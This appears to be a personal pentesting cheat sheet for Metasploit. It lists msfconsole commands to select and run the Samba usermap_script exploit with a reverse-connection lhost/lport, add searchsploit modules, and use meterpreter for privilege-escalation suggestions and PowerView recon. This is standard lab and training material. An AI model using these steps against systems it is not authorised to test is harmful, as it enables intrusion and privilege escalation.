---
title: "Metasploit"
date: 2024-6-28
tags: ["metasploit", "exploit", "vuln", "CVE", "privesc", "meterpreter", "Windows", "msfconsole", "searchsploit"]
---

---
{{< tab set1 tab1 active >}}msfconsole{{< /tab >}}
{{< tab set1 tab2 >}}meterpreter{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### Start msfconsole

<div>

```bash
msfconsole -q
```

</div>

#### Basic Commands

<div>

```bash
# Return to previous page
back
```

```bash
# Upgrade session
sessions -u
```

```bash
# quit metasploit
exit
```

</div>

#### Search Exploit

<div>

```bash
# For example: samba
search samba
```

```bash
# Choose by #num
use 15
```

```bash
# Choose by full path
use exploit/multi/samba/usermap_script
```

```bash
# Show exploit settings
options
```

```bash
# Set option, e.g.
set rhosts 10.10.11.10
```

```bash
set lhost 10.10.14.10
```

```bash
set lport 1337
```

```bash
# Run exploit
run 
```

</div>

<small>*Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter*</small>

#### Add scripts from searchsploit

<div>

```bash
mkdir -p ~/.msf4/modules/exploits/linux
```

```bash
mkdir -p ~/.msf4/modules/exploits/windows
```

```bash
# For example a linux script
cp 12345.rb ~/.msf4/modules/exploits/linux
```

```bash
# Inside msfconsole
reload_all
```

```bash
# Search
search 12345
```

</div>

#### Fix no search result

<div>

```bash
# Inside msfconsole, check db status
db_status
```

```bash
sudo service postgresql start
```

```bash
update-rc.d postgresql enable
```

```bash
sudo msfdb init
```

```bash
# Go bask to msfconsole and check again
db_status
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### Basic Commands

<div>

```bash
# Return from meterpreter
background
```

</div>

#### Use Exploit

<div>

```bash
# Quick look of potential privesc (Windows)
# Need to return from meterpreter
use post/multi/recon/local_exploit_suggester
```

```bash
# Select opened session
set session 1
```

```bash
# Show exploit settings
options
```

```bash
# Set option, e.g.
set rhosts 10.10.11.10
```

```bash
# Run exploit
run 
```

</div>

#### Use powershell

<div>

```bash
# Use powershell module
use powershell
```

```bash
# Import module
powershell_import /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
```

```bash
# Spawn powershell session
powershell_shell 
```

</div>

{{< /tabcontent >}}

<br>